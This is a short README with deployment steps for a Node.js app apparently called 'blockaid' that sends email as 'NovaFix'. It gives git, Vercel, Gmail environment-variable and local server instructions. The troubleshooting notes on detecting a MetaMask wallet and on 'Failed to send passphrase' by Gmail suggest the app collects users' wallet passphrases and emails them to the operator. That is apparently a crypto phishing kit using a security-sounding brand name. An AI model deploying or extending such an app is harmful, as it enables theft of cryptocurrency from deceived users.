# Deploy to Vercel (Free)

This app is ready to deploy to Vercel, which supports full-stack Node.js + static front-end hosting.

## Quick Deploy

### 1. Push to GitHub

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/YOUR_USERNAME/blockaid.git
git push -u origin main
```

### 2. Deploy on Vercel

1. Go to [vercel.com](https://vercel.com)
2. Click "New Project"
3. Select your GitHub repo
4. Set environment variables:
   - `EMAIL_SERVICE` = `gmail`
   - `EMAIL_USER` = your Gmail
   - `EMAIL_PASS` = your App Password
   - `EMAIL_FROM` = `"NovaFix" <your-email@gmail.com>`
5. Click "Deploy"

Vercel will auto-deploy when you push to GitHub.

## Local Development

### Start both servers

**Terminal 1 (API):**
```fish
npm start
```

**Terminal 2 (Client):**
```fish
python3 -m http.server 8000
```

Then open `http://localhost:8000`

## Troubleshooting

**"No wallet detected"** → Install MetaMask browser extension

**"Failed to send passphrase"** → Check `.env` file has valid Gmail credentials

**CORS errors** → Make sure both servers are running and API_BASE in script.js is correct
